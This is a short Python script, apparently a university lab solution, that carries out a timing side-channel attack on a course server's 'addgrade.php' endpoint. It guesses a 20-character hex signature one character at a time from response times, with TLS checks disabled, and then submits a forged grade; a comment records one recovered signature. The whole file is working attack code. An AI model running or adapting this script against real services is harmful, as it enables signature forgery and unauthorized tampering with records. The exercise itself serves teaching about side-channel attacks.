import requests

requests.packages.urllib3.disable_warnings()

def sort(chars, cut=4):
  top = sorted(chars, key=lambda x: -x[1])[:cut]
  return [ x for x, y in top ]

def most_common(L):
  return max(set(L), key=L.count)

# An timing attack based on time consuming chrcmp function
def timing_attack(name, grade, size=20, retries=20):
  url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
  params = {'name': name, 'grade': grade, 'signature': ''}
  hex_string = '0123456789abcdef'
  print('Searching...')

  signature = [''] * size

  for i in range(size):
    sig_chars = []

    for RETRY in range(retries):
      chars = []

      for j in range(len(hex_string)):
        params['signature'] = ''.join(signature[:i]) + hex_string[j]

        r = requests.get(url, params, verify=False)
        t = r.elapsed.total_seconds()

        chars.append((hex_string[j], t))

      sig_chars.extend(sort(chars))

    signature[i] = most_common(sig_chars)
    print('{}/{}'.format(i+1, size), ''.join(signature))
  
  params['signature'] = ''.join(signature)
  r = requests.get(url, params, verify=False)
  print('Sign verified:', int(r.text) == 1)

  return params

if __name__ == '__main__':
  # Kalle, 5 => 6823ea50b133c58cba36
  params = timing_attack(input('Name: '), int(input('Grade: ')), retries=int(input('Retries: ')))
  print(params)
